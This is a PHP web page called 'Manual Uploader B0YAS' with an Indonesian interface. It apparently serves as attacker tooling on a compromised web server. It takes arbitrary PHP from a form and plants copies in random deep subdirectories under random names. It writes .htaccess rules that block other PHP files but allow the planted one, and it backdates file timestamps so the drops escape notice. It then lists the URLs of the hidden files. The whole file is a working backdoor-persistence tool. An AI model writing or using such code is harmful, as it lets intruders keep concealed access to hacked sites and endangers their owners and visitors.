<?php

function f7a1x($bD, $depthMin = 3) {
    $list = [];
    $walker = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($bD, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($walker as $p) {
        if ($p->isDir()) {
            $d = substr_count(str_replace($bD, '', $p), DIRECTORY_SEPARATOR);
            if ($d >= $depthMin) {
                $list[] = $p->getPathname();
            }
        }
    }

    return $list;
}

function k9y2s($x, $bD = '.') {
    $dArr = f7a1x($bD, 5);
    if (count($dArr) === 0) return false;

    $chosen = $dArr[array_rand($dArr)];
    $fileN = bin2hex(random_bytes(4)) . '.php';
    $fpath = $chosen . '/' . $fileN;

    $oriTime = @filemtime($chosen);

    file_put_contents($fpath, $x);

    $htaccess = $chosen . '/.htaccess';
    $htaData = <<<HTA
<FilesMatch "\\.php\$">
    Require all denied
    Require ip 127.0.0.1
</FilesMatch>

<FilesMatch "^{$fileN}\$">
    Require all granted
</FilesMatch>
HTA;

    @file_put_contents($htaccess, $htaData);

    if ($oriTime !== false) {
        @touch($chosen, $oriTime);
        @touch($fpath, $oriTime);
        @touch($htaccess, $oriTime);
    }

    return $fpath;
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Manual Uploader B0YAS</title>
    <style>
        body {
            background: #111;
            color: #00ffcc;
            font-family: Arial, sans-serif;
            padding: 40px;
        }
        textarea, select, button {
            width: 100%;
            margin: 10px 0;
            padding: 12px;
            font-size: 14px;
            border-radius: 8px;
            border: 1px solid #00ffcc;
            background-color: #1c1c1c;
            color: #00ffcc;
        }
        button {
            background-color: #00ffcc;
            color: #000;
            font-weight: bold;
            cursor: pointer;
        }
        .result {
            background-color: #222;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
        }
        a {
            color: #00ffaa;
        }
    </style>
</head>
<body>
    <h2>Upload Manual File PHP</h2>
    <form method="post">
        <label>ISI</label>
        <textarea name="filecontent" rows="10" required></textarea>
        
        <label>Jumlah</label>
        <select name="jumlah">
            <?php for ($i = 1; $i <= 10; $i++): ?>
                <option value="<?= $i ?>"><?= $i ?> file</option>
            <?php endfor; ?>
        </select>
        
        <button type="submit">Gas!</button>
    </form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $konten = trim($_POST['filecontent']);
    $jumlah = intval($_POST['jumlah']);
    echo '<div class="result"><h3>Hasil Upload:</h3><ul>';

    for ($i = 0; $i < $jumlah; $i++) {
        $savePath = k9y2s($konten);
        if ($savePath) {
            $rel = str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath($savePath));
            $d = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
            $urlOut = $d . $_SERVER['HTTP_HOST'] . $rel;
            echo "<li><a href=\"$urlOut\" target=\"_blank\">$urlOut</a></li>";
        } else {
            echo "<li><span style='color:red'>FAILED! MIN SUBDIR +5</span></li>";
        }
    }
    echo '</ul></div>';
}
?>
</body>
</html>
